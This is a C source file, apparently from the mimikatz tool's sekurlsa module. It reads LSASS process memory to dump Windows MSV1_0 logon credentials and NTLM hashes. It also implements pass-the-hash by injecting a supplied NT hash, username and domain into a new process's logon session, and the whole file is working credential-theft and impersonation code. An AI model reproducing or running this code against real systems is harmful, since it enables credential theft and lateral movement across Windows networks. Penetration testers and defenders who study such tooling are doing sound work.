/*	Benjamin DELPY `gentilkiwi`
	http://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : http://creativecommons.org/licenses/by/3.0/fr/
*/
#include "kuhl_m_sekurlsa_msv1_0.h"

const ANSI_STRING
	PRIMARY_STRING = {7, 8, "Primary"},
	CREDENTIALKEYS_STRING = {14, 15, "CredentialKeys"};

KUHL_M_SEKURLSA_PACKAGE kuhl_m_sekurlsa_msv_package = {L"msv", kuhl_m_sekurlsa_enum_logon_callback_msv, TRUE, L"lsasrv.dll", {{{NULL, NULL}, 0, NULL}, FALSE, FALSE}};
const PKUHL_M_SEKURLSA_PACKAGE kuhl_m_sekurlsa_msv_single_package[] = {&kuhl_m_sekurlsa_msv_package};

NTSTATUS kuhl_m_sekurlsa_msv(int argc, wchar_t * argv[])
{
	return kuhl_m_sekurlsa_getLogonData(kuhl_m_sekurlsa_msv_single_package, 1, NULL, NULL);
}

void CALLBACK kuhl_m_sekurlsa_enum_logon_callback_msv(IN PKUHL_M_SEKURLSA_CONTEXT cLsass, IN PLUID logId, IN PVOID pCredentials, IN OPTIONAL PKUHL_M_SEKURLSA_EXTERNAL externalCallback, IN OPTIONAL LPVOID externalCallbackData)
{
	MSV1_0_STD_DATA stdData = {logId, externalCallback, externalCallbackData};
	kuhl_m_sekurlsa_msv_enum_cred(cLsass, pCredentials, kuhl_m_sekurlsa_msv_enum_cred_callback_std, &stdData);
}

BOOL CALLBACK kuhl_m_sekurlsa_msv_enum_cred_callback_std(IN PKIWI_MSV1_0_PRIMARY_CREDENTIALS pCredentials, IN DWORD AuthenticationPackageId, IN PKULL_M_MEMORY_ADDRESS origBufferAddress, IN OPTIONAL LPVOID pOptionalData)
{
	DWORD flags = KUHL_SEKURLSA_CREDS_DISPLAY_CREDENTIAL;
	PMSV1_0_STD_DATA stdData = (PMSV1_0_STD_DATA) pOptionalData;

	kprintf(L"\n\t [%08x] %Z", AuthenticationPackageId, &pCredentials->Primary);
	if(RtlEqualString(&pCredentials->Primary, &PRIMARY_STRING, FALSE))
		flags |= KUHL_SEKURLSA_CREDS_DISPLAY_PRIMARY;
	else if(RtlEqualString(&pCredentials->Primary, &CREDENTIALKEYS_STRING, FALSE))
		flags |= KUHL_SEKURLSA_CREDS_DISPLAY_CREDENTIALKEY;

	kuhl_m_sekurlsa_genericCredsOutput((PKIWI_GENERIC_PRIMARY_CREDENTIAL) &pCredentials->Credentials, stdData->LogonId, flags, stdData->externalCallback, stdData->externalCallbackData);
	return TRUE;
}

BOOL CALLBACK kuhl_m_sekurlsa_msv_enum_cred_callback_pth(IN PKIWI_MSV1_0_PRIMARY_CREDENTIALS pCredentials, IN DWORD AuthenticationPackageId, IN PKULL_M_MEMORY_ADDRESS origBufferAddress, IN OPTIONAL LPVOID pOptionalData)
{
	PMSV1_0_PRIMARY_CREDENTIAL pPrimaryCreds = (PMSV1_0_PRIMARY_CREDENTIAL) (pCredentials->Credentials.Buffer);
	PMSV1_0_PTH_DATA_CRED pthDataCred = (PMSV1_0_PTH_DATA_CRED) pOptionalData;
	KULL_M_MEMORY_HANDLE hLocalMemory = {KULL_M_MEMORY_TYPE_OWN, NULL};
	KULL_M_MEMORY_ADDRESS aLocalMemory = {pPrimaryCreds, &hLocalMemory};

	(*pthDataCred->pSecData->lsassLocalHelper->pLsaUnprotectMemory)(pPrimaryCreds, pCredentials->Credentials.Length);
	RtlZeroMemory(pPrimaryCreds->LmOwfPassword, LM_NTLM_HASH_LENGTH);
	RtlCopyMemory(pPrimaryCreds->NtOwfPassword, pthDataCred->pthData->NtlmHash, LM_NTLM_HASH_LENGTH);
	RtlCopyMemory((PBYTE) pPrimaryCreds + (ULONG_PTR) pPrimaryCreds->UserName.Buffer, pthDataCred->pthData->UserName, pPrimaryCreds->UserName.Length);
	RtlCopyMemory((PBYTE) pPrimaryCreds + (ULONG_PTR) pPrimaryCreds->LogonDomainName.Buffer, pthDataCred->pthData->LogonDomain, pPrimaryCreds->LogonDomainName.Length);
	(*pthDataCred->pSecData->lsassLocalHelper->pLsaProtectMemory)(pPrimaryCreds, pCredentials->Credentials.Length);

	kprintf(L"Data copy @%p : ", origBufferAddress->address);
	if(pthDataCred->pthData->isReplaceOk = kull_m_memory_copy(origBufferAddress, &aLocalMemory, pCredentials->Credentials.Length))
		kprintf(L"OK !\n");
	else PRINT_ERROR_AUTO(L"kull_m_memory_copy");

	return TRUE;
}

BOOL CALLBACK kuhl_m_sekurlsa_enum_callback_msv_pth(IN PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA pData, IN OPTIONAL LPVOID pOptionalData)
{
	PMSV1_0_PTH_DATA pthData = (PMSV1_0_PTH_DATA) pOptionalData;
	MSV1_0_PTH_DATA_CRED credData = {pData, pthData};
	
	if(RtlEqualLuid(pData->LogonId, pthData->LogonId))
	{
		kuhl_m_sekurlsa_msv_enum_cred(pData->cLsass, pData->pCredentials, kuhl_m_sekurlsa_msv_enum_cred_callback_pth, &credData);
		return FALSE;
	}
	else return TRUE;
}

NTSTATUS kuhl_m_sekurlsa_msv_pth(int argc, wchar_t * argv[])
{
	BYTE ntlm[LM_NTLM_HASH_LENGTH] = {0};
	TOKEN_STATISTICS tokenStats;
	MSV1_0_PTH_DATA data = {&(tokenStats.AuthenticationId), NULL, NULL, ntlm, FALSE};
	PCWCHAR szRun, szNTLM, pFakeUserName, pFakeLogonDomain;
	DWORD i, j, dwNeededSize;
	HANDLE hToken;
	PROCESS_INFORMATION processInfos;

	if(pFakeUserName = kuhl_m_sekurlsa_msv_pth_makefakestring(argc, argv, L"user", &data.UserName))
	{
		if(pFakeLogonDomain = kuhl_m_sekurlsa_msv_pth_makefakestring(argc, argv, L"domain", &data.LogonDomain))
		{
			if(kull_m_string_args_byName(argc, argv, L"ntlm", &szNTLM, NULL))
			{
				kull_m_string_args_byName(argc, argv, L"run", &szRun, L"cmd.exe");
				if(wcslen(szNTLM) == (LM_NTLM_HASH_LENGTH * 2))
				{
					for(i = 0; i < LM_NTLM_HASH_LENGTH; i++)
					{
						swscanf_s(&szNTLM[i*2], L"%02x", &j);
						ntlm[i] = (BYTE) j;
					}
					kprintf(L"NTLM\t: "); kull_m_string_wprintf_hex(data.NtlmHash, LM_NTLM_HASH_LENGTH, 0); kprintf(L"\n");
					kprintf(L"Program\t: %s\n", szRun);
					if(kull_m_process_create(KULL_M_PROCESS_CREATE_LOGON, szRun, CREATE_SUSPENDED, NULL, LOGON_NETCREDENTIALS_ONLY, pFakeUserName, pFakeLogonDomain, L"", &processInfos, FALSE))
					{
						kprintf(
							L"  |  PID  %u\n"
							L"  |  TID  %u\n",
							processInfos.dwProcessId, processInfos.dwThreadId);
						if(OpenProcessToken(processInfos.hProcess, TOKEN_READ, &hToken))
						{
							if(GetTokenInformation(hToken, TokenStatistics, &tokenStats, sizeof(tokenStats), &dwNeededSize))
							{
								kprintf(L"  |  LUID %u ; %u (%08x:%08x)\n", tokenStats.AuthenticationId.HighPart, tokenStats.AuthenticationId.LowPart, tokenStats.AuthenticationId.HighPart, tokenStats.AuthenticationId.LowPart);
								kprintf(L"  \\_ ");
								kuhl_m_sekurlsa_enum(kuhl_m_sekurlsa_enum_callback_msv_pth, &data);
							} else PRINT_ERROR_AUTO(L"GetTokenInformation");
							CloseHandle(hToken);
						} else PRINT_ERROR_AUTO(L"OpenProcessToken");
						NtResumeProcess(processInfos.hProcess);
						CloseHandle(processInfos.hThread);
						CloseHandle(processInfos.hProcess);
					} else PRINT_ERROR_AUTO(L"CreateProcessWithLogonW");
				} else PRINT_ERROR(L"ntlm hash length must be 32 (16 bytes)\n");
			} else PRINT_ERROR(L"Missing argument : ntlm\n");
			LocalFree((HLOCAL) pFakeLogonDomain);
		}
		LocalFree((HLOCAL) pFakeUserName);
	}
	return STATUS_SUCCESS;
}

PWCHAR kuhl_m_sekurlsa_msv_pth_makefakestring(const int argc, const wchar_t * argv[], const wchar_t * name, const wchar_t ** theArgs)
{
	PWCHAR ret = NULL;
	SIZE_T len;
	if(kull_m_string_args_byName(argc, argv, name, theArgs, NULL))
	{
		kprintf(L"%s\t: %s\n", name, *theArgs);
		len = wcslen(*theArgs);
		if(ret = (PWCHAR) LocalAlloc(LPTR, (len + 1) * sizeof(wchar_t)))
			wmemset(ret, L'-', len);
	} else PRINT_ERROR(L"Missing argument : %s\n", name);
	return ret;
}

VOID kuhl_m_sekurlsa_msv_enum_cred(IN PKUHL_M_SEKURLSA_CONTEXT cLsass, IN PVOID pCredentials, IN PKUHL_M_SEKURLSA_MSV_CRED_CALLBACK credCallback, IN PVOID optionalData)
{
	KIWI_MSV1_0_CREDENTIALS credentials;
	KIWI_MSV1_0_PRIMARY_CREDENTIALS primaryCredentials;
	KULL_M_MEMORY_HANDLE hLocalMemory = {KULL_M_MEMORY_TYPE_OWN, NULL};
	KULL_M_MEMORY_ADDRESS aLocalMemory = {NULL, &hLocalMemory}, aLsassMemory = {pCredentials, cLsass->hLsassMem};

	while(aLsassMemory.address)
	{
		aLocalMemory.address = &credentials;
		if(kull_m_memory_copy(&aLocalMemory, &aLsassMemory, sizeof(KIWI_MSV1_0_CREDENTIALS)))
		{
			aLsassMemory.address = credentials.PrimaryCredentials;
			while(aLsassMemory.address)
			{
				aLocalMemory.address = &primaryCredentials;
				if(kull_m_memory_copy(&aLocalMemory, &aLsassMemory, sizeof(KIWI_MSV1_0_PRIMARY_CREDENTIALS)))
				{
					aLsassMemory.address = primaryCredentials.Credentials.Buffer;
					if(kull_m_string_getUnicodeString(&primaryCredentials.Credentials, cLsass->hLsassMem))
					{
						if(kull_m_string_getUnicodeString((PUNICODE_STRING) &primaryCredentials.Primary, cLsass->hLsassMem))
						{
							credCallback(&primaryCredentials, credentials.AuthenticationPackageId, &aLsassMemory, optionalData);
							LocalFree(primaryCredentials.Primary.Buffer);
						}
						LocalFree(primaryCredentials.Credentials.Buffer);
					}
				} else kprintf(L"n.e. (KIWI_MSV1_0_PRIMARY_CREDENTIALS KO)");
				aLsassMemory.address = primaryCredentials.next;
			}
			aLsassMemory.address = credentials.next;
		} else kprintf(L"n.e. (KIWI_MSV1_0_CREDENTIALS KO)");
	}
}